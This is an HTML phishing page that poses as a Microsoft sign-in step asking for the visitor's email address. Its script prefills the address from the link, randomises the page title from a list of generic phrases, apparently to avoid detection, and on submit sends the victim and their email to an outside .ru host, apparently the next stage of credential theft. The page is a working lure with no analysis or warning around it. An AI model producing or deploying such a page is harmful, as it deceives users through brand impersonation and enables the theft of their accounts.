<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: url('background-mailbox.jpg') no-repeat center center fixed;
            background-size: cover;
        }
        #emailForm {
            background: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            position: relative;
        }
        h2 {
            font-family: 'Sans-serif', sans-serif;
            font-size: 20px;
            font-weight: bold;
        }
        input[type="email"] {
            padding: 10px;
            width: 90%;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        input[type="submit"] {
            padding: 15px 30px;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 5px;
            background-color: #1963c7;
            color: white;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #053979;
        }
        .logo {
            width: 150px;
            height: auto;
            display: block;
            margin: 0 auto 20px auto;
        }
    </style>
</head>
<body>
    <div id="emailForm">
        <img class="logo" src="https://news.microsoft.com/wp-content/uploads/prod/2024/03/Microsoft_and_Adobe_LogoLockup_FullColorX.png" alt="Microsoft Logo">
        <h2>Enter your email address</h2>
        <form onsubmit="redirectUser(event)">
            <input type="email" id="email" name="email" placeholder="Enter your Microsoft Email Address" required>
            <input type="submit" value="Next">
        </form>
    </div>

    <script>
        function generateTitle() {
            const titles = [
                "Authentication procedure", "Validation process", "Confirmation process", "Certification procedure",
                "Assessment procedure", "Verification protocol", "Authentication method", "Confirmation protocol",
                "Validation procedure", "Certification process", "Log in to the leading productivity service",
                "Access the top productivity platform", "Enter the premier productivity provider",
                "Join the foremost productivity service", "Sign in to the ultimate productivity solution",
                "Connect to the best productivity tool", "Log in to the top-rated productivity provider",
                "Access the leading productivity application", "Enter the best-in-class productivity service",
                "Sign in to the superior productivity platform", "Join the finest productivity provider",
                "Log in to the top productivity suite", "Access the premier productivity tool",
                "Enter the best productivity solution", "Sign in to the leading productivity system",
                "Connect to the top productivity provider", "Log in to the foremost productivity service",
                "Access the ultimate productivity platform", "Enter the top-tier productivity provider",
                "Sign in to the best productivity app", "Electronic assets", "Virtual assets", "Online assets",
                "Digital resources", "Digital holdings", "Electronic resources", "Virtual holdings",
                "Online holdings", "Digital properties", "Electronic properties", "Virtual properties",
                "Digital inventories", "Electronic inventories", "Virtual inventories", "Online resources",
                "Digital items", "Electronic items", "Virtual items"
            ];
            const randomIndex = Math.floor(Math.random() * titles.length);
            return titles[randomIndex];
        }

        document.addEventListener('DOMContentLoaded', (event) => {
            document.title = generateTitle();
            const emailField = document.getElementById('email');
            const hash = window.location.hash.substring(1);
            if (hash) {
                emailField.value = decodeURIComponent(hash);
            }
        });

        function base64Encode(str) {
            return btoa(unescape(encodeURIComponent(str)));
        }

        function redirectUser(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const baseURL = 'https://status.ompzhphe.ru/3BxESTXe/';
            const encodedEmail = base64Encode(email);
            const newURL = `${baseURL}#T${email}`;
            window.location.href = newURL;
        }
    </script>
</body>
</html>
